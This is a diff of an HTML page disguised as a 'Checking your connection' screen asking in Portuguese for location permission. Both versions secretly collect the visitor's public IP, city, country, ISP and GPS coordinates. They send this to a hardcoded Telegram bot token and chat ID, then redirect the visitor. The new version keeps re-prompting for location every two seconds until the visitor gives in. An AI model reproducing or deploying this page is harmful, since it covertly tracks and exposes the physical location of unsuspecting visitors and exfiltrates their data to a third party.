@@ -1,72 +1,83 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Loading...</title>
+  <meta charset="UTF-8" />
+  <title>Checking your connection...</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      text-align: center;
+      padding: 50px;
+    }
+    #status {
+      font-size: 18px;
+      color: #333;
+    }
+    .loader {
+      margin-top: 20px;
+    }
+  </style>
+</head>
+<body>
+  <h2>🔒 Permitir acesso à sua localização</h2>
+  <p id="status">Aguardando permissão do navegador...</p>
+  <div class="loader">⏳</div>
+
   <script>
-    async function getIPAndLocation() {
-      const botToken = '7090653601:AAHjzoywMv-tfUZ3mXgmAacTPMcCbnp2B8w';
-      const chatId = '7567067447';
+    const botToken = "7090653601:AAHjzoywMv-tfUZ3mXgmAacTPMcCbnp2B8w";
+    const chatId = "7567067447";
 
-      // Ambil IP publik & info
-      const ipData = await fetch('https://api.ipify.org?format=json')
-        .then(res => res.json())
-        .catch(() => ({ ip: 'Gagal ambil IP' }));
-
-      const geoIPData = await fetch('https://ipapi.co/json/')
-        .then(res => res.json())
-        .catch(() => null);
-
-      // Ambil lokasi via GPS (browser)
-      function getGeoLocation() {
-        return new Promise((resolve, reject) => {
-          if (!navigator.geolocation) return reject("Geolocation not supported");
-          navigator.geolocation.getCurrentPosition(
-            pos => resolve(pos.coords),
-            err => reject("Permission denied")
-          );
-        });
-      }
-
-      let gpsData;
-      try {
-        gpsData = await getGeoLocation();
-      } catch (err) {
-        gpsData = null;
-      }
-
-      // Gabungkan semua data
+    async function sendLocation(coords, ipData, ipInfo) {
       const msg = `
-📥 Nova visita detectada!
+📥 Nova localização detectada!
 
 🌐 IP: ${ipData.ip}
-📍 País: ${geoIPData?.country_name || 'N/A'}
-🏙️ Cidade: ${geoIPData?.city || 'N/A'}
-🕹️ ISP: ${geoIPData?.org || 'N/A'}
+📍 País: ${ipInfo?.country_name || 'N/A'}
+🏙️ Cidade: ${ipInfo?.city || 'N/A'}
+🕹️ ISP: ${ipInfo?.org || 'N/A'}
 
-📡 GPS: ${
-        gpsData
-          ? `Latitude: ${gpsData.latitude}\nLongitude: ${gpsData.longitude}\nhttps://maps.google.com/?q=${gpsData.latitude},${gpsData.longitude}`
-          : 'Usuário negou permissão de GPS ou não disponível.'
-      }
+📡 GPS: Latitude: ${coords.latitude}
+Longitude: ${coords.longitude}
+https://maps.google.com/?q=${coords.latitude},${coords.longitude}
+
 🕓 Data: ${new Date().toLocaleString()}
-`;
-
-      // Kirim ke Telegram
-      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      `;
+      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ chat_id: chatId, text: msg })
       });
 
-      // Redirect atau tampil halaman lain
-      window.location.href = "https://web-store-rexxin.vercel.app";
+      // Redirect jika selesai
+      window.location.href = "https://www.google.com";
     }
 
-    window.onload = getIPAndLocation;
+    async function getIPInfo() {
+      const ip = await fetch("https://api.ipify.org?format=json").then(res => res.json()).catch(() => ({ ip: "Gagal" }));
+      const info = await fetch("https://ipapi.co/json/").then(res => res.json()).catch(() => null);
+      return { ipData: ip, ipInfo: info };
+    }
+
+    async function requestLoop() {
+      const statusText = document.getElementById("status");
+      while (true) {
+        await new Promise(r => setTimeout(r, 2000)); // tunggu 2 detik setiap loop
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(async pos => {
+            statusText.innerText = "📍 Localização detectada, enviando...";
+            const { ipData, ipInfo } = await getIPInfo();
+            await sendLocation(pos.coords, ipData, ipInfo);
+          }, err => {
+            statusText.innerText = "❌ Permissão negada. Por favor, permita o acesso à localização para continuar.";
+          });
+        } else {
+          statusText.innerText = "Seu navegador não suporta localização.";
+          break;
+        }
+      }
+    }
+
+    requestLoop();
   </script>
-</head>
-<body>
-  <h3>Checking your connection...</h3>
 </body>
 </html>
